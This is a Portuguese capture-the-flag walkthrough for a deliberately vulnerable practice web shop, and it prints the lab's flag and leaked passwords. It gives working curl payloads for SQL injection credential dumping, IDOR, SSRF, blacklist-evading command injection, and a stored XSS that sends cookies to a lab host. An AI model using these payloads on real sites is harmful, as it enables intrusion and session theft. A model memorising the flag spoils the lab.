# shopvuln — Loja web realista (Média)

"TechVerse Shop": uma loja com cara de produção e várias falhas encadeadas.
O objetivo final é ler `/flag.txt`.

## Flag
- `CYBERLAB{sh0p_rce_m3dium}` — em `/flag.txt` (via command injection)

## Falhas

| Rota | Falha |
|---|---|
| `/search?q=` | SQLi UNION-based |
| `/login` | SQLi auth bypass + session fixation |
| `/orders/<id>` | IDOR |
| `/feedback` | XSS armazenado |
| `/api/status?url=` | SSRF |
| `/tools/ping?host=` | command injection (blacklist falha) |
| `/admin` | broken access control |

## 1) Enumeração
```bash
python3 /root/tools/portscan.py IP 80
curl -s IP | head
```

## 2) SQLi — `/search` (extrai credenciais)
```bash
curl -s "http://IP/search?q=' UNION SELECT username||':'||password,1 FROM users-- -"
# -> admin:T3chV3rse_Admin!99  alice:alice123  bob:letmein
```

## 3) Login e IDOR
```bash
# login legítimo com credenciais vazadas
curl -s -c cookies.txt "http://IP/login" --data "u=admin&p=T3chV3rse_Admin!99"

# IDOR: order 1 pertence a outro usuário, mas acessível
curl -s -b cookies.txt "http://IP/orders/1"
```

## 4) SSRF — `/api/status`
```bash
curl -s "http://IP/api/status?url=http://127.0.0.1/"
curl -s "http://IP/api/status?url=http://127.0.0.1/tools/ping?host=127.0.0.1"
```

## 5) Command injection — `/tools/ping`
A blacklist bloqueia `;`, `&`, backtick — mas não `|` nem `$()`:
```bash
curl -s "http://IP/tools/ping?host=127.0.0.1|id"
curl -s "http://IP/tools/ping?host=127.0.0.1|cat${IFS}/flag.txt"
# -> CYBERLAB{sh0p_rce_m3dium}
```
(`${IFS}` contorna o espaço, se necessário.)

## 6) XSS armazenado — `/feedback`
```bash
curl -s "http://IP/feedback" --data "msg=<script>document.location='http://172.30.0.2:'+document.cookie</script>"
# ao abrir a página, o payload executa (roubo de sessão)
```

## Caminho lógico completo
```
search (SQLi) -> credenciais -> login -> IDOR -> feedback (XSS) -> tools/ping (RCE) -> /flag.txt
```